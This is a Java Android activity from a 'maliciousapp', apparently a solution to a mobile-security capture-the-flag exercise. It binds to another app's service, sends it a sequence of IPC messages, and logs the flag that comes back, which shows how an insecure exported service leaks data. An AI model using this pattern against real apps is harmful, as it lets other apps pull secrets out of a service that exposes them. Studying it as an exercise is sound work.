package com.example.maliciousapp;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;

public class MainActivity extends Activity {
    /** Messenger for communicating with the service. */
    Messenger mService = null;

    /** Flag indicating whether we have called bind on the service. */
    boolean bound;

    static final int MSG_REGISTER_CLIENT = 1;

    static final int MSG_SET_VALUE = 3;

    static final int MSG_GET_FLAG = 4;

    static final String TAG = "MOBIOTSEC";

    /**
     * Handler of incoming messages from service.
     */
    class IncomingHandler extends Handler {
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case MSG_SET_VALUE:
                    Log.i(TAG, String.valueOf(msg.arg1));
                case MSG_GET_FLAG:
                    try{
                        Bundle b = (Bundle) msg.obj;
                        Log.i(TAG, b.get("flag").toString());
                    } catch (Exception e){
                        Log.getStackTraceString(e);
                    }
                    break;
                default:
                    super.handleMessage(msg);
            }
        }
    }

    /**
     * Target we publish for clients to send messages to IncomingHandler.
     */
    final Messenger mMessenger = new Messenger(new IncomingHandler());


    /**
     * Class for interacting with the main interface of the service.
     */
    private ServiceConnection mConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName className, IBinder service) {
            // This is called when the connection with the service has been
            // established, giving us the object we can use to
            // interact with the service.  We are communicating with the
            // service using a Messenger, so here we get a client-side
            // representation of that from the raw IBinder object.
            Log.i(TAG, "I am in!");
            mService = new Messenger(service);
            bound = true;
            sayHello();
        }

        public void onServiceDisconnected(ComponentName className) {
            // This is called when the connection with the service has been
            // unexpectedly disconnected -- that is, its process crashed.
            mService = null;
            bound = false;
            Log.i(TAG, "onServiceDisconnected");
        }
    };

    public void sayHello() {
        if (!bound) return;
        // Create and send a message to the service, using a supported 'what' value
        Message msg = Message.obtain(null, MSG_REGISTER_CLIENT);
        msg.replyTo = mMessenger;
        Message msg1 = Message.obtain(null, MSG_SET_VALUE, 2 ,0);
        Message msg2 = Message.obtain(null, MSG_GET_FLAG);
        try {
            mService.send(msg);
            mService.send(msg1);
            mService.send(msg2);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onStart() {
        super.onStart();
        // Bind to the service
        Intent i = new Intent();
        i.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.UnbindableService"));
        bindService(i, mConnection, Context.BIND_AUTO_CREATE);
    }

    @Override
    protected void onStop() {
        super.onStop();
        // Unbind from the service
        if (bound) {
            unbindService(mConnection);
            bound = false;
        }
    }
}